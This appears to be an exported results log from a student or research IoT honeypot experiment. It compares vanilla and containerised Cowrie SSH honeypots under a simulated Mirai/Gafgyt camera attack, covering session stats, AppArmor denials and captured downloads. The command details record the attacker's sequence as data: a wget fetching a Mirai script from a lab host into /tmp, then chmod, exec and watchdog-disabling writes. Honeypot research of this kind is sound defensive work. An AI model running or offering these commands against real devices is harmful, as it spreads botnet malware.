@@ -1,0 +1,149 @@
+EXPERIMENT: tp-camera-mirai-gafgyt-2f8dcc5f
+EXPORTED: 25/03/2026 19:51:21
+
+-=-=-= VANILLA HONEYPOT -=-=-=
+   source: /home/franek/IoT-Honeypot-for-Detecting-Attacks/Honeypot Project/vanilla-honeypot/cowrie
+   port: SSH 2222
+
+-=-=-= CONTAINERISED HONEYPOT -=-=-=
+   container: cowrie-honeypot
+   port: SSH 2223
+
+-=-=-= HOW TO LOAD LOGS -=-=-=
+  Pandas:
+    import pandas as pd
+    df = pd.read_json('vanilla/cowrie.json', lines=True)
+    df = pd.read_json('containerised/cowrie.json', lines=True)
+
+-=-=-= NOTES -=-=-=
+  cowrie.json : one JSON object per line (JSON Lines format)
+  cowrie.log  : human readable text version of same events
+  downloads/  : captured binaries named by SHA256 hash
+                Cowrie deduplicates — each unique file stored once
+
+
+
+- This malware succesfully connects to the C2 server and holds a connection via HTTP
+	- but connection drops as the C2 server uses TCP/UDP (confirmed via tria.ge) 
+- Five AA blocks
+
+
+                
+CLI OUTPUT:
+
+============================================================
+RESULTS: tp-camera-mirai-gafgyt-2f8dcc5f_25-03-2026_1951
+============================================================
+
+
+Vanilla Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 116 lines
+
+Containerised Honeypot
+------------------------------------------------------------
+cowrie.json 31 events
+      10 cowrie.client.var
+       5 cowrie.session.file_download
+       4 cowrie.command.input
+       3 cowrie.session.file_download.failed
+       1 cowrie.session.connect
+       1 cowrie.client.version
+       1 cowrie.client.kex
+       1 cowrie.login.success
+       1 cowrie.session.profile
+       1 cowrie.client.size
+       1 cowrie.session.params
+       1 cowrie.log.closed
+       1 cowrie.session.closed
+    cowrie.log 460 lines
+
+    LOG CROSS-EXAMINATION
+------------------------------------------------------------
+Containerised.json == Vanilla.json?
+    Vanilla          json=4 log=4 TRUE
+    Containerised    json=4 log=14 FALSE
+
+SESSION COMPARISON
+------------------------------------------------------------
+    Vanilla:    1 session(s)
+        average duration 31.6s
+    Containerised:    1 session(s)
+        average duration 33.1s
+
+COMMAND COMPARISON
+------------------------------------------------------------
+    Vanilla:    4 command event(s)
+    Containerised:  4 command event(s)
+    Do commands match : FALSE
+
+COMMAND DETAILS
+------------------------------------------------------------
+    SESSION        TIMESTAMP                        COMMAND
+    [Vanilla] bf527b59b214 2026-03-25 19:48:06.084404+00:00 wget http://10.0.2.15:8888/botnet_mirai_arm_448db776.sh -O /tmp/dvrhelper
+    [Vanilla] bf527b59b214 2026-03-25 19:48:09.988729+00:00 chmod 777 /tmp/dvrhelper 
+    [Vanilla] bf527b59b214 2026-03-25 19:48:12.121048+00:00 exec /tmp/dvrhelper 
+    [Vanilla] bf527b59b214 2026-03-25 19:48:12.122011+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+    [Containerised] cfad841634d2 2026-03-25 19:49:33.502206+00:00 wget http://10.0.2.15:8888/botnet_mirai_arm_448db776.sh -O /tmp/dvrhelper
+    [Containerised] cfad841634d2 2026-03-25 19:49:37.307079+00:00 chmod 777 /tmp/dvrhelper
+    [Containerised] cfad841634d2 2026-03-25 19:49:39.361614+00:00 exec /tmp/dvrhelper 
+    [Containerised] cfad841634d2 2026-03-25 19:49:39.363269+00:00 echo '' > /dev/watchdog; echo '' > /dev/misc/watchdog; echo '' > /dev/watchdog0; echo '' > /sbin/wat
+
+DOWNLOADS DETAILS
+------------------------------------------------------------
+    Hashes match:   TRUE
+    Shared hashes:  2
+
+APPARMOR DENIALS
+------------------------------------------------------------
+Total denials: 16
+
+By Operation:
+      14 mknod
+       2 open
+
+    Detail:
+
+    TIMESTAMP                        OPERATION  PROCESS    PATH
+    2026-03-25 19:50:44.444999933+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 19:50:44.453000069+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/__pycache__/_versio
+    2026-03-25 19:50:44.470999956+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 19:50:44.494999886+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 19:50:44.496000051+00 open       twistd   /home/cowrie/cowrie/
+    2026-03-25 19:50:44.552000046+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/core/__pycache__/ne
+    2026-03-25 19:50:44.578999996+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 19:50:44.592999935+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/commands/__pycache_
+    2026-03-25 19:50:44.594000101+00 mknod      twistd   /home/cowrie/cowrie/cowrie-env/lib/python3.12/site
+    2026-03-25 19:50:44.598000050+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/ses
+    2026-03-25 19:50:44.605000019+00 mknod      twistd   /home/cowrie/cowrie/src/cowrie/ssh/__pycache__/fac
+    2026-03-25 19:50:46.250000+00:00 open       bash     /dev/tty
+    2026-03-25 19:50:46.250999927+00 mknod      bash     /dev/watchdog
+    2026-03-25 19:50:46.250999927+00 mknod      bash     /dev/watchdog0
+    2026-03-25 19:50:46.250999927+00 mknod      bash     /usr/bin/watchdog
+    2026-03-25 19:50:46.252000092+00 mknod      bash     /etc/watchdog
+
+SECCOMP DENIALS
+------------------------------------------------------------
+Total denials: 0
+   Visualising analysis...
+    Saved: 01_session_duration.png
+    Saved: 02_command_timeline.png
+    Saved: 03_apparmor_overview.png
+    Saved: 04_apparmor_blocked_paths.png
+
+Press Enter to continue...
+
